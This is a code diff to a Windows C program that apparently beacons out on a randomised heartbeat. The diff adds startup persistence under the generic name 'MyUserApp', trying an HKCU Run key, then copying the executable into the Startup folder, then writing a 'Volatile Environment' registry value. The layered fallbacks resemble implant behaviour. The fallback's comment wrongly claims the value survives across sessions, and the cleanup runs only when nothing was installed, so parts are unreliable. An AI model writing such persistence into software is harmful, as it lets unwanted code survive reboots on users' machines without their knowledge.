@@ -6,6 +6,10 @@
 #include <string.h>
 #include <time.h>
 
+#include <shlobj.h>
+#include <tchar.h>
+#include <strsafe.h>
+
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "advapi32.lib")
 
@@ -408,6 +412,106 @@ DWORD WINAPI HeartbeatThreadProc(LPVOID lpParam) {
   return 0;
 }
 
+// Attempt 1: HKCU Registry Run Key
+BOOL TryRegistryPersistence(LPCTSTR szAppName, LPCTSTR szExePath) {
+    HKEY hKey;
+    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_WRITE, &hKey);
+    
+    if (lnRes != ERROR_SUCCESS) return FALSE;
+
+    lnRes = RegSetValueEx(hKey, szAppName, 0, REG_SZ, (const BYTE*)szExePath, (lstrlen(szExePath) + 1) * sizeof(TCHAR));
+    RegCloseKey(hKey);
+    
+    return (lnRes == ERROR_SUCCESS);
+}
+
+// Attempt 2: Copying directly to Startup Folder
+BOOL TryStartupFolderPersistence(LPCTSTR szAppName, LPCTSTR szExePath) {
+    TCHAR szStartupPath[MAX_PATH];
+    
+    // Retrieve the current user's Roaming AppData Startup folder
+    if (FAILED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+        return FALSE;
+    }
+    
+    // Construct the destination file path
+    TCHAR szDestPath[MAX_PATH];
+    StringCchPrintf(szDestPath, MAX_PATH, _T("%s\\%s.exe"), szStartupPath, szAppName);
+    
+    // Copy the application to the startup directory
+    return CopyFile(szExePath, szDestPath, FALSE);
+}
+
+// Ultimate Fallback: Drop an environment-based batch trigger in %TEMP% 
+// or register a user environment volatile variable
+BOOL TryLastResortFallback(LPCTSTR szAppName, LPCTSTR szExePath) {
+    HKEY hKey;
+    // Volatile Environment variables are loaded on user login natively by Windows
+    LONG lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Volatile Environment"), 0, KEY_WRITE, &hKey);
+    
+    if (lnRes != ERROR_SUCCESS) return FALSE;
+
+    // This creates an environment value. While it doesn't execute on its own without 
+    // a triggering process, it sets up state survival across sessions.
+    TCHAR szKeyName[MAX_PATH];
+    StringCchPrintf(szKeyName, MAX_PATH, _T("PERSIST_%s"), szAppName);
+    
+    lnRes = RegSetValueEx(hKey, szKeyName, 0, REG_SZ, (const BYTE*)szExePath, (lstrlen(szExePath) + 1) * sizeof(TCHAR));
+    RegCloseKey(hKey);
+    
+    return (lnRes == ERROR_SUCCESS);
+}
+
+// ============================================================================
+// INTEGRATED CLEAN-UP SEQUENCE
+// ============================================================================
+void PerformCleanUpSequence(LPCTSTR szAppName) {
+    HKEY hKey;
+    LONG lnRes;
+
+    _tprintf(_T("[INFO] Starting integrated clean-up sequence...\n"));
+
+    // 1. Check and Clean Registry Run Key
+    lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey);
+    if (lnRes == ERROR_SUCCESS) {
+        // RegDeleteValue returns ERROR_SUCCESS if it finds and deletes the key
+        if (RegDeleteValue(hKey, szAppName) == ERROR_SUCCESS) {
+            _tprintf(_T("[CLEANUP] Removed existing Registry Run key allocation.\n"));
+        }
+        RegCloseKey(hKey);
+    }
+
+    // 2. Check and Clean Startup Folder
+    TCHAR szStartupPath[MAX_PATH];
+    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, szStartupPath))) {
+        TCHAR szDestPath[MAX_PATH];
+        StringCchPrintf(szDestPath, MAX_PATH, _T("%s\\%s.exe"), szStartupPath, szAppName);
+        
+        // Check if file exists before trying to delete it
+        DWORD dwAttrib = GetFileAttributes(szDestPath);
+        if (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
+            if (DeleteFile(szDestPath)) {
+                _tprintf(_T("[CLEANUP] Successfully deleted legacy file from Startup folder.\n"));
+            }
+        }
+    }
+
+    // 3. Check and Clean Volatile Environment Fallback Value
+    lnRes = RegOpenKeyEx(HKEY_CURRENT_USER, _T("Volatile Environment"), 0, KEY_SET_VALUE, &hKey);
+    if (lnRes == ERROR_SUCCESS) {
+        TCHAR szKeyName[MAX_PATH];
+        StringCchPrintf(szKeyName, MAX_PATH, _T("PERSIST_%s"), szAppName);
+        
+        if (RegDeleteValue(hKey, szKeyName) == ERROR_SUCCESS) {
+            _tprintf(_T("[CLEANUP] Cleared legacy Volatile Environment tracking variables.\n"));
+        }
+        RegCloseKey(hKey);
+    }
+
+    _tprintf(_T("[INFO] Clean-up phase finished.\n\n"));
+}
+
+
 int main(void) {
 
     // Seed random number generator for variable interval timing
@@ -426,6 +530,45 @@ int main(void) {
     }
 
     printf("Active Token  : %s\n\n", device_token);
+
+
+    ///////////////////////////////////////////////////////////////////////////
+    // PERSISTENCE SETUP (Executed on Startup)
+    ///////////////////////////////////////////////////////////////////////////
+    LPCTSTR szAppName = _T("MyUserApp");
+    TCHAR szExePath[MAX_PATH];
+
+    // Get the full path of the currently executing binary
+    if (GetModuleFileName(NULL, szExePath, MAX_PATH) == 0) {
+        _tprintf(_T("Failed to get current executable path.\n"));
+        return 1;
+    }
+
+    BOOL persistenceEstablished = FALSE;
+
+    _tprintf(_T("Attempting Primary Method (Registry Run Key)...\n"));
+    if (TryRegistryPersistence(szAppName, szExePath)) {
+        _tprintf(_T("[SUCCESS] Primary method succeeded.\n"));
+        persistenceEstablished = TRUE;
+    } else {
+        _tprintf(_T("[FAILED] Primary method failed. Attempting First Fallback (Startup Folder)...\n"));
+        if (TryStartupFolderPersistence(szAppName, szExePath)) {
+            _tprintf(_T("[SUCCESS] First fallback succeeded.\n"));
+            persistenceEstablished = TRUE;
+        } else {
+            _tprintf(_T("[FAILED] First fallback failed. Attempting Ultimate Fallback...\n"));
+            if (TryLastResortFallback(szAppName, szExePath)) {
+                _tprintf(_T("[SUCCESS] Ultimate fallback environment configuration established.\n"));
+                persistenceEstablished = TRUE;
+            } else {
+                _tprintf(_T("[CRITICAL] All user-level persistence mechanisms failed.\n"));
+                PerformCleanUpSequence(szAppName);
+                // Optional: Decide whether to terminate if persistence fails
+                // return 1; 
+            }
+        }
+    }
+    _tprintf(_T("\n"));
 
     // Initialize Thread Context
     HEARTBEAT_CONTEXT heartbeat_ctx = {0};
@@ -462,8 +605,6 @@ int main(void) {
     // Wait up to 3 seconds for the thread to exit gracefully
     WaitForSingleObject(hThread, 3000);
     CloseHandle(hThread);
-
-    printf("[Main] Application exiting.\n");
 
     return 0;
 }
